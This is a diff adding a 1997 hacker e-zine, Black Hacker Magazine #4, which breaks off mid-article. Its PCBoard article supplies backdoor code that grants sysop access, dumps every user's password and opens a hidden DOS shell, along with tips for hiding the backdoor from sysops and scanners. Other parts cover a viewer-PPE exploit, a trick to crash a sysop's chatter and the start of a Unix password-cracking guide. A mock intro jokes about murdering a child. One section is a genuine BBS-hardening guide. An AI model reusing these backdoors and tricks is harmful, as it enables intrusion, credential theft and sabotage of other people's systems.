@@ -1,0 +1,2311 @@
+@BEGIN_FILE_ID.DIZ
+   ________
+   \       \_______________
+----\_____  \      /  ____/_________
+----bio!|    \    /____________    /-.
+  |     |_________\________   /   /  |
+  |                      \_______/   |
+  |  ns! - black hacker magazine #4  |
+  |  ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~  |
+  |        - ascii edition -         |
+  |  articles on hacking, phraud     |
+  |  internet, and lotsa more! Leech |
+  |  it now you lamahs!              |
+  |                                  |
+  `--[11/08/97]-------------[o1/o1]--'
+@END_FILE_ID.DIZ
+
+
+
+
+
+
+
+.----softbank------.                                        .---------------.
+| ZD ^ ZIFF-DAVIS  |                                        | A W A R D E D |
+`------------------'                                        |               |
+                                                            |  sell-out mag |
+                                                            |  of the MONTH |
+                                                            |   July 1997!  |
+                                                            `---------------'
+
+
+
+
+                                  A N
+         ____________________   _______________________________
+         \    _    \     _   \  \_   ______\_____    \    \    |----\
+         |    |    |     |   |   |_____    |    |    |    |    _____|
+         |    |    |     |   |   |    |    |    _    |    |    |    |
+         |    |    |     |   |   |    |    |    |    |    |    |    |
+         |    |    |     |   |   |    |    |    |    |    |         |
+         |____|    |____     |   |____     |____|    |____|____     |
+      .=======`----'====`----'========`----'====`----'=========`----'==.
+      |         O F F I C I A L   N O  S H I T !   R E L E A S E       |
+      `----------------------------------------------------------------'
+
+    gomez      _/\/\_
+    says!      \_o0_/              "You're gonna get high on knowledge, and
+    _______oOOo(____)oOOo_______    I'm gonna be your pusher!"
+   |               U            |
+   |______.ooO________Ooo.______|
+          (  )`--.---'(  )
+          | |    |     | |
+          `-'    :     `-'
+
+
+
+
+
+
+                        - hacked, packed and released! -
+                                the almighty...
+                   
+                   sS$
+----b-l-a-c-k----- $$$ý$Ss sS$ý$Ss sS$ý$Ss sS$ $$$ sS$ý$Ss sS$ý$Ss -------------
+$$$$$$$$$$$$$$$$$$ $$$ $$$ $$$ $$$ $$$ $$$ $$$ $$$ $$$ $$$ $$$ $$$ $$$$$$$$$$$$$
+$$$$$$$$$$$$$$$$$$ $$$ $$$ $$$ý$$$ $$$ ýýý $$$s$$ý $$$sýýý $$$ $$$ $$$$$$$$$$$$$
+$$$$$$$$$$$$$$$$$$ $$$ $$$ $$$ $$$ $$$ $$$ $$$ $$s $$$ $$$ $$$ $$$ $$$$$$$$$$$$$
+$$$$$$$$$$$$$$$$$$ $$$ $$$ $$$ $$$ $$$ $$$ $$$ $$$ $$$ $$$ $$$ ý$$ $$$$$$$$$$$$$
+------------------ $$$ $$$ $$$ $$$ $$$s$$$ $$$ $$$ $$$s$$$ $$$ -m-a-g-a-z-i-n-e-
+                       ý$$ n u m b e r  f o u r            ý$$
+
+               Editorial Staff: Codeblaster and Ripperjack
+                  Chief Editor: Codeblaster
+                     Subeditor: Ripperjack
+            Drafting Committee: Codeblaster and TNSe
+                      Couriers: Aphazel
+                                Mr. Quaint
+                       Writers: Codeblaster
+                                Deathwalker
+                                Ripperjack
+                                Phiber X *
+                                Buzzbug
+                                XiZoL
+                                TNSe
+                                M.
+
+
+
+ *NOTE* if you're in a windows environment use DOS' EDIT.COM to view this
+        text for maximum performance! :)=
+
+
+.-===========================================================================-.
+|                        _/_                 | Black Hacker Magazine Issue #4 |
+|          ._______     //    /]!            | ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ |
+| ___ __ __|_      \_.__\\ ________/______   |  [A] - [b] - [c] - [d] - [e]   |
+|(__/   \   /        _   \      _ /     _/_  |  094   258  1823  1945  2181   |
+| |____ /_ /       _ /__ / _____\\ ___  \__) | ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ |
+|         /________\_ n o  s h i t !  \/     | Prestuff: Just some opening    |
+|        /                                   | stuff, editorial and such ...  |
+`-===[SECTION A: PRESTUFF]===================================================-'
+
+
+
+.-==[Editorial]==============================================================-.
+|===[By: Codeblaster]=[BHM#4]=[01k]=[#01]=====================================|
+`-===========================================================================-'
+
+ As you proably noticed in the beginning of this file, BHM, has - as many
+ other great magazines - sould out to Ziff Davis! And from beeing a non-
+ commercial, information freedomfighting group/zine, it has now become a
+ highly commercial zine, where we write Mr. Davis' thoughts. The rules
+ are - we have to have the Ziff-Davis logo at the top of every file, we
+ have to mention his name (Ziff) at least one time every 1000 words -
+ and we're not allowed to have any illegal articles. (articles about hacking,
+ phreaking and anarchy are considered illegal) - AND, get this (this is the
+ hard part), WE HAVE TO SPELL RIGHT! :/ (that means we can't say "werd",
+ "sup?", etc.)... hmmmm
+
+ K, 'nuff bs. let's kick it hard...
+
+ Black Hacker Magazine has some kewl info this time, but we're (still)
+ lacking alot on the unix section. Me and Ripperjack have finally installed
+ unix and moved from lamers to wannabe's ;) That means, that you'll probably
+ see some more unix stuff here in the future, as we expand our knowledge
+ on the subject. We need more writers, so please send us articles by email.
+
+ I'm joining the Army in a couple of days, so this will probably be the last
+ BHM for a while (I'm going to be there for 12 months). Due to this,
+ Ripperjack is temporarily in charge of NS!, which means he can release
+ files etc. but I doubt there will be a BHM until I come back ... but then
+ again, he might surprise us all :) Well, anyway - this was a bit <in a
+ hurry> release, I wanted to add more stuff but we didn't get time due
+ to the deadline (Middle of Augus'97). We have also added some new sections
+ this issue - sections you will find in each BHM from now on; Contest
+ (with a price! wow;), News & an Add section. So check it out.
+
+ `So much to read, so much to learn - but so little time' - that's actually
+ a real problem to me. fewk, I need to be able to stop time or something.
+
+
+ Codeblaster/food^ns!^grs
+
+
+    gomez      _/\/\_
+    says!      \_o0_/            <- In case you're wondering what that dude
+    _______oOOo(____)oOOo_______    is doing right under the NS! logo then
+   |               U            |   let me introduce you to GOMEZ! He's some
+   |______.ooO________Ooo.______|   kind of smart animal, and he is going to
+          (  )`--.---'(  )          be our official mascot from now on!
+          | |    |     | |          Ladies and hackers, please welcome....
+          `-'    :     `-'          "GOMEZZZ!!!" (*applause*)
+
+
+
+                   http://gudmund.vgs.no/~anepm/hpa/
+
+
+
+
+.-==[Table Of Contents]======================================================-.
+|===[By: Codeblaster]=[BHM#4]=[03k]=[#02]=====================================|
+`-===========================================================================-'
+
+     _   ___.-.  _   ___      ___ ___    ___ ___ ___ _   ___ ___ _   ___
+   _/ l_/   \_|_/ |_/  _|   _/   \_ _| _/  _/   \_  \_l_|  _|   \_l_/   \_
+   \_ _/_ | _/ \_ |\_ _/    \_ | _/_/  \_ l\_ | _/| _/_/_ _/_ | _/_/_ l__/
+    | | |   | | | | | | |    | | | |    | |_| | | | | | | | | | | | l_  |
+    | l | | | | | l | l |    | | | |    | l | | | | | l | l | | | l | | |
+    l_  l_| l___l_  l_  |÷2F÷l___l_|    l_  l___l_| l_  l_  l_| l_  l_  |
+      `-' `-'     `-' `-'                 `-'     `-' `-' `-' `-' `-' `-'
+    .--.-----.-------t-a-b-l-e---o-f---c-o-n-t-e-n-t-s------------------.
+    |# | Line| Subject                                              |k  |
+    |--|-----|----------------------------------------------------------|
+    |=====[SECTION A: PRESTUFF]=========================================|
+    |01| 106 | Editorial                                            |01k|
+    |02| 162 | Table Of Contents                                    |03k|
+    |03| 204 | Buzzbug joins NS! A Little intro from himself :)     |02k|
+    |=====[SECTION B: HACKING!]=========================================|
+    |04| 269 | Pcboard Backdoors Reviewed                           |11k|
+    |05| 482 | How to protect your BBS/Pcb from beeing hacked       |08k|
+    |06| 643 | Desire Bug / Olm Bug (?)                             |02k|
+    |07| 683 | Another Cracking Unix Passwords Article (Newbies)    |14k|
+    |08|1200 | Basic Cracking by TNSe'97                            |15k|
+    |09|1388 | Cereal Hacker: Legendary inspiration or a has-been?  |17k|
+    |10|1638 | The hackers worst nightmare (?)                      |04k|
+    |11|1721 | Find bugs in Unix Systems                            |02k|
+    |12|1776 | My first hack                                        |03k|
+    |=====[SECTION C: MISC STUFF]=======================================|
+    |13|1834 | How to earn (alot of) money on Credit Check Fraud    |01k|
+    |14|1855 | One of the better ways to hide DOS files (?)         |03k|
+    |=====[SECTION D: INTERNET]=========================================|
+    |15|1956 | Hexediting your MIRC32.EXE to make it eliter! :)     |03k
+    |16|2015 | New way of earning money on The Internet             |01k|
+    |17|2032 | Internet Resources (kewl URLs)                       |08k|
+    |=====[SECTION E: BYE-BYE!]=========================================|
+    |18|2193 | This Issues CONTEST! First time EVER in BHM!         |01k|
+    |19|2229 | Add Section! Private, personal adds here!            |02k|
+    |20|2266 | NoShit! BBS'(HQ's and Dist Sites)                    |02k|
+    |21|2300 | That's it for this time folks! ;)                    |   |
+    `--`-----`------------------------------------------------------'---'
+
+.-==[Buzzbug joins NS! A Little intro from himself :)]=======================-.
+|===[By: Buzzbug]=[BHM#4]=[02k]=[#03]=========================================|
+`-===========================================================================-'
+
+                           !$#!BuzzBug!#$!
+			  
+  No Shit! got a new writer called BuzzBug. No one knew shit about him so we 
+  decided to phone the Swedish Police and ask about him. And they sent us
+  his crime record.
+ 
+  1. Busted for Phreaking 4 times.
+  2. Busted for Robbery.
+  3. Busted for Murder on a 3 year old child. 
+  4. Escaped from jail 1997-07-09.
+  5. GONE! No one knows where he his.
+  
+  Then we phoned his mom (dont ask me how we got the number).
+  And she told us that he always was searching for THE ULTIMATE 2600Hz TONE. 
+  His mom was so ugly so we tried to hang up as fast as we could.
+  
+  Well the Murder was cool so we decided to phone the childs parants :
+  
+  Dad     - Mr. Andersson
+  NoShit! - Hello we would like to know if BuzzBug killed your child ?
+  Dad     - Yes he did but i dont want to talk about it (Dad is Crying).
+  NoShit! - OK. But do you know why he did it ?
+  Dad     - No i dont. He smashed the door to our apparment at the same time
+            he was screaming "I NEED 2600HZ TONES IN MY BLOOD!" he was crazy.
+	    Then he saw our child playing around with the phone.....please
+	    i dont want to talk about it.
+  NoShit! - Dont be a Pussy keep on!
+  Dad     - Ok....well when he saw our kid playing with the phone he said
+            "YOUR KID DOSENT NEED 2600HZ TONES AS MUCH AS I DO!" then he shoot
+	    my kid (Dad crying more!).
+  NoShit! - C'mon keep it moving....
+  Dad     - HE SHOOT MY KID IN THE HEAD!$!#
+  NoShit! - Calm down.......
+  Dad     - Then he connected him self to the phoneline and disappeared.
+  NoShit! - Thats all?
+  Dad     - Yes it is (crying)
+  NoShit! - Ok. God Bye.
+  
+  *CLICK*
+  
+BuzzBug was arrasted 3 weeks later while he was screaming : 
+"I NEED 2600HZ TONES !" in a supermarket in Sweden.
+
+6 months later BuzzBug Escaped from jail when he connected him self to the
+Phone. NO ONE knows where he is but some dudes belives that he is out
+somewhere in CyberSpace searching for THE ULTIMATE 2600HZ TONE!#$
+
+- BuzzBug
+  Mail : BuzzBug@Hotmail.com
+
+.-===========================================================================-.
+|                        _/_                 | Black Hacker Magazine Issue #4 |
+|          ._______     //    /]!            | ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ |
+| ___ __ __|_      \_.__\\ ________/______   |  [a] - [B] - [c] - [d] - [e]   |
+|(__/   \   /        _   \      _ /     _/_  |  094   258  1823  1945  2181   |
+| |____ /_ /       _ /__ / _____\\ ___  \__) | ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ |
+|         /________\_ n o  s h i t !  \/     | Hacking!: What do you think?   |
+|        /                                   |                                |
+`-===[SECTION B: HACKING!]===================================================-'
+
+
+.-==[Pcboard Backdoors Reviewed]=============================================-.
+|===[By: Codeblaster]=[BHM#4]=[11k]=[#04]=====================================|
+`-===========================================================================-'
+
+  Okay, we've written some about Pcboard hacking in earlier issues of BHM,
+  but we've never looked at backdoors in PPE's (Pcb doors/compiled scripts)
+  So, since this is one of the most popular ways of hacking Pcboard, I'm
+  going to look a little closer on that in this article. Here's a little
+  index of this article:
+
+                 1........................Classic Backdoors
+                 2........................Backdoor Scanners
+                 3.......................Advanced Backdoors
+                 4.......PPE's that can be used for hacking
+
+1. Classic Backdoors
+~~~~~~~~~~~~~~~~~~~~
+  Classic backdoors are pretty lame, cause the PPE Backdoor scanners will
+  find them, and the sysops will most likely find them their self. But I'm
+  going to show you some examples, so you get some idea (or you can use this
+  as a list of backdoors NOT to use;)
+
+  GETUSER                              ; Get User Info
+  U_SEC = SYSOPSEC()                   ; Set security level = Sysop's
+  PUTUSER                              ; Save User Info
+
+  Okay, this is probably the most common backdoor - as you've probably
+  understood, this is supposed to give the current user sysop's security
+  level. However, what most don't know is that the code above doesn't
+  work as it should. When you run the code above you get sysop's security
+  level MINUS ten. I don't know why it is that way, maybe it's a bug in
+  pcboard or something, but it is that way. So, the correct code would be:
+
+  GETUSER                              ; Get User Info
+  U_SEC = SYSOPSEC()+10                ; Set security level = Sysop's
+  PUTUSER                              ; Save User Info
+
+  Ok, from now on I will refer to the backdoor code above as Backdoor #1.
+  The next backdoor is also pretty classic (we'll call this one Backdoor #2);
+
+  STRING USERSFILE                                ; Define Strings
+  INT X,USERS                                     ; Define Integers
+
+  USERSFILE = READLINE(PCBDAT(),29)               ; Get Users filename/path
+  USERS = FILEINF(USERSFILE, 4) / 400             ; Get Number of Users
+                                                  ; Size of userfile / 400
+                                                  ; since each record is 400b
+  FOR X = 1 TO USERS                              ; A loop
+    GetAltUser X                                  ; Get User Record X
+    Println "---------(",X,"/",USERS,")---------" ; Just to make it look good
+    Println U_Name()                              ; Show Users Name
+    Println U_Pwd                                 ; Show Users PWd
+  NEXT X                                          ; The Loop Again
+
+  The one above lists all users to the screen. Maybe it's an idea with
+  mprintln (look later in this article). This works fine, but it is often
+  easily discovered by the sysop (if he's not extremely lame that is)
+
+
+2. Backdoor Scanners
+~~~~~~~~~~~~~~~~~~~~
+  I only know of 2 backdoor scanners for Pcboard. There might be more, if
+  you know of anyone else than the ones released by AEGIS and FOOD let me
+  know. Here they are:
+
+
+AGSPPS10.ZIP       25596 bytes          _ __________        _ __________
+                                   _____   \       /____ ______\       /
+                                _ _\___ \___\_____/ ___/_\______\  ___/___
+                                :.   _/  \  __/__   \    \/      \______  \
+                                ù   __    \_     \_  \_   \_  kL  \_  \/   \_
+                                __ __/     /______/________/_______/________/
+                                ,---/_____/-cORP!---------------------------.
+                                |                                           |
+                                |           AEGiS PPE Scanner 1.O           |
+                                |   Scan your PPEs against backdoors and    |
+                                |  others annoying things. PPLX required!!  |
+                                |                                           |
+                                `=[EXE]===============================[1/1]='
+
+FOOD!BKD.ZIP
+
+
+
+  You will probably find the first one on AEGIS' homepage at:
+  http://www.mygale.org/05/aegis/
+  And FOOD's backdoor scanner you can find on FOOD's homepage:
+  http://www.ozet.de/privat/freezone/food/index.html
+
+  Personally I prefer FOOD's release, but that's probably cause I was the
+  one who coded it ;). AEGIS is good to use if you're checking the PPE's
+  yourself, but if you want the whole thing automated in your upload
+  processor or something FOOD's release is perfect. Ok, here's the result I
+  got when I scanned the different backdoor sources shown in this article:
+
+  Backdoor #1:
+        AEGIS: þþþþ BACK1.PPE MIGHT CONTAIN A BACKDOOR þþþþ Flags Rh
+        FOOD : Suspicious lines: 3 / Logical Backdoor: 1 of 3
+  Backdoor #2:
+        AEGIS: þþþþ BACK2.PPE MIGHT CONTAIN A BACKDOOR þþþþ Flags: Rdh
+        FOOD : Suspicious lines: 5 / Logical Backdoor: 2 of 3
+
+  *NOTE* about AEGIS' ppescanner:
+  The flags used are:
+                        F - Change conference flags status
+                        W - Write user
+                        R - Read user
+                        D - Delete user
+                        A - Adjust online time remaining
+                        B - Brute hangup
+                        M - Send text to modem only
+                        S - Shell to DOS
+                        C - Call child PPE
+                        I - Interrupt call
+                        P - Poke in memory
+                        c - Change password
+                        a - Adjust ratio
+                        f - Flag files for download
+                        d - Access PCBOARD.DAT
+                        p - Peek in memory
+                        H - Read Password or Password History
+                        i - Sequencially read files in directory
+                        s - Sysop level access
+
+  If one of the flags above are found, the AEGIS ppescanner will report:
+  "þþþþ SCANNED.PPE MIGHT CONTAIN A BACKDOOR þþþþ" and that's kind of lame
+  cause *MANY* ppe's use the commands above. That means that if you scan
+  a userlister, filelist ppe, qwk download, login ppe, etc.etc.etc. you
+  will get "MIGHT CONTAIN A BACKDOOR" ...
+
+3. Advanced Backdoors
+~~~~~~~~~~~~~~~~~~~~~
+  First, some hints'n'tips:
+                           * Use MPRINTLN instead of PRINTLN. This prints to
+                             YOUR screen only and not SYSOPS screen. So when
+                             you list all his users he will just think the
+                             PPE hangs a couple of secs ;)
+
+                           * When you add backdoors don't add the whole code,
+                             make it "fit in". Fex. if you add a backdoor to
+                             a userlister, variables such as NUMBER OF USERS
+                             etc. will most likely exist from before. A good
+                             backdoor is only 1 line added to a source. 
+
+                           * Compile your PPE's as PPE 3.30, this way the
+                             sysop might have more problems decompiling it.
+
+  Ok, I'm not going to list hundreds of backdoors codes here, cause I haven't
+  got the time for that - but I'll show you a couple I think is neat;
+
+  * Just use the CALL command to call another PPE (which contains the real
+    backdoor). You upload the PPE containing the backdoor when you're going
+    to do the hack - this requires that we know his UPLOAD directory, but
+    then again that's not very hard to find out using the 'TEST' command to
+    test a file in the upload directory.
+    You can add this in whatever ppe you want; IF <INSTRING> = "FUCKTHIS"
+    THEN CALL <UPLOADPATH>+PPENAME.PPE  <- Pseydocode ofcourse, if you know
+    anything about PPL this shouldn't be any problem, if you don't then
+    don't even think of hacking PCBoard. 
+
+  * You can use the SHELL command, although this command is more likely
+    to be a backdoor then the one above. But it's easier though, just add
+
+ INT CODE        ; Just to define the CODE variable as INTEGER
+ STRING DOTHIS   ; Just to define the DOTHIS variable as STRING
+ DOTHIS = "CTTY>"+READLINE(PCBDAT(),52)
+ IF <INSTRING> = "FUCKTHIS" THEN SHELL TRUE,CODE,DOTHIS,""
+    (Pseydocode)
+    This will allow you to shell to DOS and do whatever you want there, while
+    the sysop sees nothing but a his board on the screen (Like it's hanged)
+
+  Just experiment, there are MANY commands in PPL that can be used as back-
+  doors, so it really isn't that hard. 
+
+4. PPE's that can be used for hacking
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+  Some PPE's can be used to hack with even if they don't contain backdoors.
+  These have major bugs, and I'm compiling a list of PPE's that have these
+  bugs - so if you know of any please email them to me! An example of ppe's
+  which often have this kind of bugs are PCB/ANSI viewer PPE's (Art PPE's).
+  These often let users add ansis and they often use the DispFile command
+  to display the ansis to the screen. If a user then adds "!C:\UPLOAD\RUN.PPE"
+  in an ansi and displays that with the art-ppe RUN.PPE will be executed.
+  Here are one I found:
+
+-(FileName)---(Rel.date)----------------(File_id.diz)-------------------------
+FSW-AG.ZIP     25.02.95                 _______________________ __ __ __
+                                        \__   _______/ _______//  |  |  \_
+Comment: One can use this PPE to        ::|  _____)_____  \::_/   |  |   /:
+view every file on the whole HD,        ::|    \__/eR! |   \_\_____     /::
+and also run PPE's. Easy hack.          [=|_____/\__________/[fSW]\____/==]
+                                        |  ALiENViEW v1.0 By Code Zero    |
+                                        |  The Best Ansi/TXT/ASC/PCB..etc.|
+                                        |  Viewer PCBoard Has Ever seen!  |
+                                        |  Upload/Download/View/MultiConf |
+                                        |  Supports Up to 9990 Files !!!  |
+                                        |  And 999 Conferences w/ 10 Files|
+                                        |  Per Conference! This is Cool!  |
+                                        `-[02/25/95]----------------------'
+
+  I need more PPE's on this list, so if you have some PPE's please look
+  for this; Art PPE's (as the first above), Wall PPE's that uses Dispfile,
+  Oneliners that users Dispfile, flag ppe's with bugs, download ppe's, etc.
+
+  Ok, due to lack of time before releasing this magazine, I couldn't check
+  all my PPE's, so this is the only one included in this mag. It's just
+  meant as an example anyway, so it doesn't matter. If you have any released
+  PPE's with known backdoors please send some info to blackhackers@hotmail.com
+  ... Maybe I'll compile a huge list some day :)
+
+                                                    - Codeblaster/Food^ns!^Grs
+
+
+.-==[How to protect your BBS/Pcb from beeing hacked]=========================-.
+|===[By: Codeblaster]=[BHM#4]=[08k]=[#05]=====================================|
+`-===========================================================================-'
+
+In my years as a bbs hacker I've been stunned time after time over how stupid
+some sysops really are. This is a little tutorial on how to protect yourself
+from beeing hacked, it's written for Pcboard but some of these hints will fit
+other systems too. When my board was up, I KNEW it was 99,99% hacking-proof.
+If anyone were to hack it, it would be my fault, and not the systems. This can
+also be a guide to setting up a hacking-proof bbs. So if you're a sysop, read
+on...
+
+Some general hints:
+===================
+
+ * Never let the paths/filenames in your system be default. Fex. in PCBOARD
+   never use the directory C:\PCB, in Remote Access never use C:\RA and in
+   BBBS/MBBS never use C:\BBS (You should never use this no matter what
+   sytem you have, btw).
+
+   It's also a good idea to change names of important files. Fex. when we
+   hacked Pcboard we often used a search engine that searched for PCBOARD.DAT
+   I know this method is often used, so if you're smart you would change this
+   filename to HUBAHUBA or something like that and run PCBOARD.EXE with the
+   parameters : PCBOARD.EXE /FILE:HUBAHUBA
+
+   (*NOTE* If you rename the PCBOARD.DAT file some utils that are made for
+           Pcboard might cause problems. F.ex. PFED - cause they only ask
+           for the PATH wich PCBOARD.DAT is placed in, not the NAME. This
+           is something that should be fixed in PFED and similar programs,
+           since keeping the original filenames of importing files as that
+           often is a security risk)
+
+   Users file etc. is also a good idea to rename if you can.
+
+ * Remove / don't add support for RAR (the archiver) in your upload
+   processor. As we exposed in TBH-RAR.ZIP, RAR can be used to hack
+   with if one know the right tricks. If you run Pcboard you don't
+   have to worry, since RAR is not added in as default (You'll have
+   to have added it yourself), but in the newest versions BBBS/MBBS
+   I think it's added. You should avoid having NEW archivers in general
+   in your upload processor since the early versions of programs often
+   have security flaws.
+
+   Archivers that we have tested and that are safe (from the RAR bug
+   that is) are: PkZIP, Arj and Lha.
+
+ * Never run programs you're told to run in a chat. (this also goes for
+   PPE's and scripts etc.) This is probably #1 hacking method; exploiting
+   the fact that the sysop is a dumbass. If some newuser just uploads a
+   PPE or a EXE and tells you to run it, you should watch out. Try dropping
+   to dos and pretending that you run it, see what he does when you let him
+   out of the chat.
+
+ * Never do stuff a user you don't know tells you to do. (This only applyes
+   if you're unexperiensed and actually don't know what the fuck you're
+   doing.) Fex. don't press F1 in pcboard cause this gives the user sysop
+   axx, and don't drop to dos and write 'COMMAND.COM COM2' cause this let's
+   him drop to dos etc. If you're not a dumbass, and have a slight idea
+   of what you're doing then you can forget this one.
+
+ * Don't give users access to commands that can be exploited ;) duh, well
+   it isn't that stupid. If you give a user access to the EXT command in
+   MBBS he can actually hack you (did you know that?) - Sigops useally
+   have access to this command in MBBS, that means that all sigops on MBBS'
+   can hack the board.
+
+Pcboard specific hints:
+=======================
+
+ * Remove the 'TEST' command. Hackers can find out ANY directory on your
+   bbs that files is located in, just by TESTING files in the different
+   catagories. This will help hackers alot, since they don't have to make
+   a search engine, and the trojan will be helluva lot faster. You can
+   ofcourse update the 'TEST' command with a PPE or something, but it's
+   probably not worth the work cause no one ever uses this anyways (?).
+
+ * Remove all sysop commands (1-15) - You probably never use them as you
+   probably never call your bbs and configure it from somewhere else than
+   home. If you do, you can always add a new sysop menu system in a secret
+   command that require sysop-access.
+   ----------
+   If you're not thinking clear right now, or are a bit unexperiensed with
+   pcboard, you're probably asking yourself "Remove TEST and Remove sysop
+   commands?? Sure, but how the fuck do I do that?".
+
+   Answer: Well, duh. Install .PPE's doing <NOTHING> or printing "This
+   command is removed for security purposes" on the screen (whatever)
+   in CMD.LST ... The PPE must be installed under the commands you want
+   to remove ofcourse. If you want to remove the TEST command, then
+   install this in your CMD.LST
+
+   TEST                10        0        0     C:\MYBOARD\PPES\REMOVED.PPE
+
+   And to remove the sysop commands you install the same PPE under 1-15.
+
+ * Remove the 'HELP' command, or make a PPE only showing the original help
+   files and no others. The \HELP\ directory is perfect for hackers, cause
+   one can place PPE's there and execute them by writing "HELP FUCKYOU"
+   (Where FUCKYOU is the name of the HELP file wich executes the .PPE)
+
+   The HELP command is never used anyways (well, if you're running a board
+   with lotsa lame users it might be used alot - so then you might wanna
+   make that PPE).
+
+ * Remove the 'PPE' command (A sysop's command to EXECUTE ppe's). If you
+   don't want to remove it entirely (I sometimes had use for this one)
+   you can make a PPE that first asks for password and if entered correctly
+   executes the PPE specified.
+
+ * If you're running Pcboard v15.21 (or earlier) upgrade immediately! It's
+   easy to hack you using a bug in the software (as we exposed in Bhm#2),
+   and anyone can run PPE's they upload.
+
+   If you don't have the chance to upgrade, or don't want to (?), you should
+   close the upload directory for Users. This way, hackers can't upload
+   ppe's and run them. However, when you've valuated the files, and put
+   them on your board, they can run them.
+
+ * Edit your FSEC file. How to do it? Run PCBSETUP.EXE, press "B" and "B",
+   and then F2 on the FSEC file. Here you add the directories that users
+   can't download files from. Protected directories should at least be
+   \PCB\MAIN\, cause that's where the users file is. You can ofcourse add
+   other directories too.
+
+
+Other Hints:
+------------
+When my board was up, I had lotsa little utilities I made myself, to make
+it more hack-proof. Here are some examples of the stuff I had, with a little
+PPL skills and maybe some Pascal/Whatever skills you can do this yourself:
+
+* I had an exe added in my PCB.BAT file that checked the lines 6 to 23 in
+  PCBOARD.DAT for changes. If one of the lines were something else than
+  110 (fex.) if would alert me. This is a nice way to prevent the classic
+  pcboard trojan, wich set's all sec levels to 0 instead of 110 so anyone
+  can run the sysop commands. (If you've removed the sysop commands you
+  probably don't have much use for this, but why not?)
+
+* Many people use those <PRESS ENTER> prompt PPE's. Me too. In this PPE I
+  added a check for the users security level. If the user had the same
+  security level as sysop (and he wasn't sysop) he would be logged off
+  immediately. This method was pretty good, cause since the users can't
+  do anything without the <PRESS ENTER> ppe pops up, they will be logged
+  off if they in some (weird) way gain sysop access.
+
+  I noticed the power of this once, when my stupid brother (the only flaw
+  in my system;) gave a user sysop access ("cause the user asked him") blah.
+  Well, the user was logged off a couple of secs later ;)
+
+* If you haven't removed the HELP command you can install a program in
+  PCB.BAT wich checks for NEW files in \PCB\HELP\. If any files that
+  shouldn't be there are there, then it should alert you. This is also
+  a classic way to hack pcboard; place new ppe's and help files in \HELP\
+  they can be runned then.
+
+  Follow these tips, and you'll have a pretty safe Pcb system - but of course
+  not unhackable.
+                                                            - Codeblaster
+
+
+.-==[Desire Bug / Olm Bug]===================================================-.
+|===[By: Codeblaster]=[BHM#4]=[02k]=[#06]=====================================|
+`-===========================================================================-'
+
+These bugs were given to me by Inm. Thanx man!
+
+Desire Bug
+----------
+If you have access to the 'V' command in Desire (Which most users have?), you
+can use it to view ANY files in current directory. That means that you will
+be able to view the files in C:\DESIRE\*.* - but you have a problem, cause
+the userfile is not located there is it? Well, by running DOORS you should
+be able to get current dir to be C:\DESIRE\DATA (or whatever the users
+file dir is called in desire), and then View the userfile.
+**IMPORTANT**
+Oki, that was the bug as I got it reported, but I installed Desire to check
+it out and I couldn't get it to work on version 1.2b (Maybe it never has
+worked?). Only the sysop had access to the View command, and he could view
+files all over the HD. 
+
+Olm bug
+-------
+You can use @DOORS:xxxxx@ to run any door? Just another one I haven't
+checked out, so I can't guarantee anything.
+
+-------
+I can't verify that the bugs above exists/is working, so check it out
+yourself, and give me some feedback if you want. And while we're at it
+with this bug thing, why not show you guys a little bug in PCB also;
+
+This isn't really a hacking bug, but it can MESS UP pretty well, and it
+always works. Did you know that by pressing CTRL-X while in a chatter
+in PCBoard (or whatever PPE), you fuck it totally up so that the sysop
+will have to load a new chatter? He can't go out to main either! You
+can continue this until it gets so slow that you think you're back to
+good ol' 2400 again =) .. Tell the lamer that you've put a virus on his
+system, and he'll probably freak ;). Maybe you can get him to load so
+many ppe's that he get memory errors, and maybe that can be explored more?
+
+
+.-==[Another Cracking Unix Passwords Article (Newbies)]======================-.
+|===[By: XiZoL]=[BHM#4]=[14k]=[#07]===========================================|
+`-===========================================================================-'
+
+
+* [ see internet resources for wordlists ]
+
+Cracking Unix passwords ( in very simple words:-))
+ Hah, my buddy, you've got in to the system just now and what do you do?
+Now i'll tell you that you can get more login/password pairs for this system
+ and even root one, if the root  is silly enough ,:-) or it's your lucky day.
+So what do you do for it?  You need to get the passwd file for
+this system, which is usually at /etc/passwd. This file contains the
+information about all users in this system, including users' passwords,
+but it's not all so easy, the password there its encrypted.Let's have a look
+on this file: usually it contains a bunch of lines like this:
+george:fhUjI0HydqSA:502:501:George Washington:/home/george:/bin/bash
+
+  As you see it has 6 different fields, each one separated with ":" from the
+other. The first field here is user name ( or login name ) this one is used
+by user as the name to enter for the "Enter login:" prompt.  the second
+field,(as you may guess) is password, it is encrypted using one way
+encryption function, and when user login and enter his password system just
+encrypt it again using the salt-two characters,(here fh) which are randomly
+choosen when user set new password,(the system always save it as two first
+characters in the encrypted password sequence) and then just check it with
+the existing encrypted password in passwd. Mind that system DOES NOT DECRYPT
+PASSWORD, so there are very few chances for us to do the same.
+*******************************************************************************
+  !Note!: some systems may have shadowed passwords though, so when you look
+at the passwd entry, you will see only the asterik(*) in place of password. 
+This means that the password is hidden or "shaddowed" in another file, it
+might be different file for different systems like in Linux it is
+/etc/shadow, in FreeBSD it is master.pwd etc ( have a look on system manual
+to see where the password are. In this case you gotta get this file as well
+(say using finger hole or any other you know) some folx on #hack told me
+though, that i can use simple C program to unshaddow this file (its source i
+attached bellow as well) but i haven't checked it yet, so i can't say
+whenever it works or not, if check it out, please tell me ok?
+********************************************************************************
+   Going back to passwd line,next field,the number 502 is the User ID, i
+don't think we can use it here anyhow, so I won't explain about it.  The
+number after UID, is the Group ID, the identifer of the main group,user
+attached to, ( of course there might be many others groups as well, that you
+can find at /etc/groups, but the main one always saved in passwd) the next
+field here is User Real Name, then user home directory, and the last one is
+user's shell.
+  Now, let's have a close look on encrypted password, as i already said the
+first two characters here are salt, the random value which is used to extend
+the number of various combinations of encrypted passwords for each 8 or less
+character password. And the rest of those characters, are the encrypted
+passwd, not the passwd in fact, but the array of 64 zero bits encrypted with
+passwd as the key.
+   Since this enctyption algorythm started being used for passwords
+encryption, many people were working on reversing it (even the son of well
+known Morison (the author of the worm-virus) but neither of them was
+successed, so now the only way is used to break unix passwords, to brutally
+force it. But the straight forcing may take you years to get the password,
+so now we use some modification of it which is called intellegent forcing.
+The idea is next : we have the dictonary of the most used password ( you can
